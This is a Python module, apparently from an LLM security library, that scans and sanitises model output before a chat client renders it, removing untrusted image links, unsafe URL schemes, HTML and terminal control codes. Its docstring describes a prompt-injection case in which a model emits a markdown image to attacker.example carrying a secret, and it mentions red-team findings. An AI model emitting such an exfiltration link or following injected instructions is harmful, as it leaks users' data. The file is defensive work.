"""Output handling (OWASP LLM05): neutralize model output that would act on the client.

The classic zero-click exfiltration: an injected document makes the model emit
  ![x](https://attacker.example/log?d=<secret>)
and the chat UI fetches it, leaking data in the URL. We strip images and links to
non-allowlisted domains, and drop raw HTML/script.

Also neutralized (found by the garak red team, see eval/garak/):
- script-capable URL schemes (javascript:, vbscript:, data:text/html) in links, images or bare text
- any HTML tag, escaped rather than rendered (event handlers like onerror= live inside tags)
- terminal escape sequences (ANSI/C1 control codes) that can rewrite a log viewer or terminal
"""

from __future__ import annotations

import re
from urllib.parse import urlparse

from promptwall.types import Action, Finding, Verdict

MD_IMAGE = re.compile(r"!\[([^\]]*)\]\(\s*(<?)([^)\s>]+)(>?)[^)]*\)")
MD_LINK = re.compile(r"(?<!!)\[([^\]]*)\]\(\s*(<?)([^)\s>]+)(>?)[^)]*\)")
HTML_TAG = re.compile(r"<\s*(script|iframe|img|object|embed|svg|style|link|meta)\b[^>]*>(?:.*?<\s*/\s*\1\s*>)?", re.I | re.S)
ANY_TAG = re.compile(r"</?\s*[a-zA-Z][^<>]*>")
BAD_SCHEME = re.compile(r"\b(javascript|vbscript|livescript)\s*:|\bdata\s*:\s*text/html", re.I)
ANSI = re.compile(r"\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)?|\x1b\[[0-?]*[ -/]*[@-~]|\x1b[@-_]|[\x80-\x9f]|[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]")
SAFE_SCHEMES = {"http", "https", "mailto", ""}


def _allowed(url: str, domains: list[str]) -> bool:
    if BAD_SCHEME.search(url) or urlparse(url).scheme.lower() not in SAFE_SCHEMES:
        return False  # javascript:, data:, etc. have no hostname but are not "same origin"
    host = (urlparse(url).hostname or "").lower()
    if not host:
        return True  # relative link: same origin
    return any(host == d or host.endswith("." + d) for d in domains)


def check(text: str, allowed_domains: list[str]) -> Verdict:
    findings: list[Finding] = []

    def img(m):
        if _allowed(m.group(3), allowed_domains):
            return m.group(0)
        findings.append(Finding("output", "exfil:markdown_image", f"image to {urlparse(m.group(3)).hostname or urlparse(m.group(3)).scheme}"))
        return f"[image removed: {m.group(1) or 'untrusted source'}]"

    def link(m):
        if _allowed(m.group(3), allowed_domains):
            return m.group(0)
        findings.append(Finding("output", "exfil:link", f"link to {urlparse(m.group(3)).hostname or urlparse(m.group(3)).scheme}"))
        return f"{m.group(1)} [link removed]"

    def tag(m):
        findings.append(Finding("output", "unsafe_html", f"<{m.group(1).lower()}> removed"))
        return ""

    def esc(m):
        findings.append(Finding("output", "unsafe_html", "html tag escaped"))
        return m.group(0).replace("<", "&lt;").replace(">", "&gt;")

    def scheme(m):
        findings.append(Finding("output", "unsafe_scheme", f"{m.group(0).split(':')[0].strip().lower()}: neutralized"))
        return m.group(0).replace(":", "[:]")

    def ctrl(m):
        findings.append(Finding("output", "terminal_escape", "control sequence removed"))
        return ""

    out = ANSI.sub(ctrl, text or "")
    out = MD_IMAGE.sub(img, out)
    out = MD_LINK.sub(link, out)
    out = HTML_TAG.sub(tag, out)
    out = ANY_TAG.sub(esc, out)
    out = BAD_SCHEME.sub(scheme, out)
    if not findings:
        return Verdict()
    return Verdict(Action.REDACT, findings, out)
